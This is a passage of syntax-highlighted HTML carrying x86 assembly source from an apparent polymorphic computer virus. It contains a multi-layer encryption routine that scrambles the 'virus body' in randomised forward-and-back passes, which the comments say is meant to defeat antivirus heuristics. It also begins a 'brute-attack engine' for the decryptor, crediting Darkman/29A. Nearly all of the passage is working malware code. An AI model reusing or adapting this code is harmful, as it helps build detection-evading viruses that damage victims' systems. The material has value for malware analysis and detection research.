        </span><span class="sc1">;      ³Ú¿³³   ù   ù   ù   ù   ù   ´  five layers</span><span class="sc0">
        </span><span class="sc1">;      ³³³³³Ú¿ ù ù ù ù ù ù ù ù ù ù ´  seven layers</span><span class="sc0">
        </span><span class="sc1">;      ÀÙ³³³³³ ù ù ù ù ù ù ù ù ù ù Ù</span><span class="sc0">
        </span><span class="sc1">;    ³³ÀÙ³</span><span class="sc0">
        </span><span class="sc1">;    ÀÙ  ³</span><span class="sc0">
        </span><span class="sc1">;        </span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;Here you can see I need layers buffer, where I have all</span><span class="sc0">
        </span><span class="sc1">;movement (down and up). Every byte has this structure:</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;      8th bit (down/up), 7th-1st bit (+/- movement)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;Some equations:</span><span class="sc0">
        </span><span class="sc1">;  * maximum layers:</span><span class="sc0">
        </span><span class="sc1">;     ((file_size-2^7*4)/(layer_buf-file_size-2^7*4))/2=968</span><span class="sc0">
        </span><span class="sc1">;  * typical layers:</span><span class="sc0">
        </span><span class="sc1">;     2^7 * 4 * layer_buf / file_size = 68</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;Where:</span><span class="sc0">
        </span><span class="sc1">;  * file_size = calculated for 18,000 bytes</span><span class="sc0">
        </span><span class="sc1">;  * layer_buf = calculated for 2,400 bytes</span><span class="sc0">
        </span><span class="sc1">;  * 2^7 = we have eight bites without one (+/-)</span><span class="sc0">
        </span><span class="sc1">;  * 4 = we use dword, not byte</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;The layers buffer is behind polymorphic loop, and it cer-</span><span class="sc0">
        </span><span class="sc1">;tains anti-heuristic :), because in that buffer are gaps.</span><span class="sc0">
        </span><span class="sc1">;And these treatments are inside polydecoding loop.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__mlg_map</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;layers memory map</span><span class="sc0">
        </span><span class="sc5">__mlg_size</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;size of layer buffer</span><span class="sc0">
        </span><span class="sc5">file_size2</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;(file_size+3rd l.)/8</span><span class="sc0">
        </span><span class="sc5">file_size3</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;file_size2 * 8</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ppe_mlayer_generate</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save all registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; allocate memory for layer map</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;number of encrypted bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">000000C9h</span><span class="sc0">       </span><span class="sc1">;get size of layers map</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">   </span><span class="sc1">;maximum is 2,600 bytes</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">;multiply by eight</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1000</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;[ESP] = size of layers map</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc2">03h</span><span class="sc0"> </span><span class="sc1">;divide by eight</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">          </span><span class="sc1">;allocate that memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mlg_map</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; generate eight parts</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mlg_map</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;EDI = memory layers map</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;ECX = actual part</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;EDX = position in layer</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mlg_gen_max_movement</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">;the first movement</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;EBX = position in vbody</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">; + memory layer map</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">; + pos in actual layer</span><span class="sc0">
    </span><span class="sc5">__mlg_next_movement</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mlg_gen_max_movement</span><span class="sc0">  </span><span class="sc1">;generate new movement (+/-)</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__mlg_no_compare</span><span class="sc0">    </span><span class="sc1">;if AL==0, then "go up" flag</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000003h</span><span class="sc0">       </span><span class="sc1">; 2 * DOWN, 1 * UP</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;go back ? (it means UP !)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;movement</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__mlg_go_down</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;EBX - EAX &lt; 0 ?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">__mlg_go_down</span><span class="sc0">       </span><span class="sc1">;if yes, go down, not up</span><span class="sc0">
        </span><span class="sc5">__mlg_no_compare</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; = actul pos in vbody</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">;set "go up" flag</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc5">__mlg_go_down</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; = actual pos in vbody</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">;write new movement (+/-)</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">; + memory layer map</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">; + pos in actual layer</span><span class="sc0">
    </span><span class="sc5">__mlg_compare</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;EDX == size of layers map/8</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">__mlg_continue</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;next part</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;position in layer</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">;number of encrypted bytes</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">       </span><span class="sc1">;was it last part ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__mlg_no_last</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_size3</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;file_size + 3rd_loop</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;encrypted bytes</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">; - EBX</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">00000008h</span><span class="sc0">
        </span><span class="sc5">__mlg_no_last</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_size2</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;EBX &lt; file_size2 ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;my the only one empty reg :)</span><span class="sc0">
        </span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">__mlg_continue</span><span class="sc0">      </span><span class="sc1">;no bytes to down ? ESI &gt; 0 ?</span><span class="sc0">
        </span><span class="sc5">__mlg_no_last_next</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mlg_gen_max_movement_without_test</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;ESI + EAX &lt;= 0, then okay</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;ESI + EAX &gt;  0, then again</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;set (Z)ero flag</span><span class="sc0">
        </span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">         </span><span class="sc1">;set (C)arry flag</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0">       </span><span class="sc1">;all right</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__mlg_no_last_next</span><span class="sc0">  </span><span class="sc1">;ESI + EAX &gt; 0</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;number of encrypted bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">;and write that...</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">; + memory layer map</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">; + pos in actual layer</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;position in vbody</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;ESI += EAX, bytes to down</span><span class="sc0">
        </span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">         </span><span class="sc1">;ESI &gt; 0 ?</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__mlg_no_last_next</span><span class="sc0">
    </span><span class="sc5">__mlg_continue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">       </span><span class="sc1">;last part ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__mlg_next_movement</span><span class="sc0"> </span><span class="sc1">;next and next loop...</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mlg_map</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;number of encrypted bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mlg_size</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc1">; encrypt the encrypted virus body by 3rd decoding loop :)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mlg_map</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;layers memory map</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mlg_size</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;size of layers buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_value</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">__mlg_next_byte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">;load movement</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;convert to ECX &amp; 7Fh</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7Fh</span><span class="sc0">          </span><span class="sc1">;clear (+/-) flag</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_value_add</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;damn bug !</span><span class="sc0">
    </span><span class="sc5">__mlg_next_dword</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_style</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__mlg_xor</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_style</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__mlg_add</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__mlg_next_value</span><span class="sc0">
    </span><span class="sc5">__mlg_add</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__mlg_next_value</span><span class="sc0">
    </span><span class="sc5">__mlg_xor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc5">__mlg_next_value</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;next value (+)</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">;bits rotate</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">;check that flag</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__mlg_go_cow</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">       </span><span class="sc1">;next value (-)</span><span class="sc0">
    </span><span class="sc5">__mlg_go_cow</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">          </span><span class="sc1">;next byte (value)</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__mlg_next_dword</span><span class="sc0">
        </span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">           </span><span class="sc1">;test 7th bit</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__mlg_back</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">  </span><span class="sc1">;forward and back now ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__mlg_fback</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__mlg_fback</span><span class="sc0">
    </span><span class="sc5">__mlg_back</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">  </span><span class="sc1">;back and forward now ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__mlg_fback</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">__mlg_fback</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;next movement</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__mlg_next_byte</span><span class="sc0">

        </span><span class="sc1">; generate the 5th number of CRC-getting</span><span class="sc0">
    </span><span class="sc5">__pbi_again</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00DFFFFFh</span><span class="sc0">       </span><span class="sc1">;maximum searching number</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10000h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">__pbi_again</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pbi_last_num</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pbi_add_num</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc1">; restore all registers</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__mlg_gen_max_movement_without_test</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000080h</span><span class="sc0">       </span><span class="sc1">;generate &lt;0,128) number</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__mlg_gen_max_movement_without_test</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__mlg_gen_max_movement</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mlg_gen_max_movement_without_test</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_size2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__mlg_gmm_failed</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;i haven't any empty reg</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_size2</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;EBX+EAX &gt; file_size2 ?</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;if yes, generate other</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">__mlg_gen_max_movement</span><span class="sc0">  </span><span class="sc1">;number</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">         </span><span class="sc1">;hidden STC instruction</span><span class="sc0">
        </span><span class="sc5">__mlg_gmm_failed</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ brute-attack engine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Welcome to my brute-attack engine  in poly-decoding loop.</span><span class="sc0">
        </span><span class="sc1">;At first I generate five valuez and their checksum,  then</span><span class="sc0">
        </span><span class="sc1">;I'll store that checksum and I will find right five value</span><span class="sc0">
        </span><span class="sc1">;by its checksum. Maximal value of 5th number is 0xDFFFFF.</span><span class="sc0">
        </span><span class="sc1">;This number I'll find per 0.82 second on P233. And I know</span><span class="sc0">
        </span><span class="sc1">;it's very good result.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;I would like to thank Darkman/29A for his:</span><span class="sc0">
        </span><span class="sc1">;   * "RDEA" article in 29A #3 issue</span><span class="sc0">
        </span><span class="sc1">;   * ideas and theory</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;This function is only for you... your ideas...</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
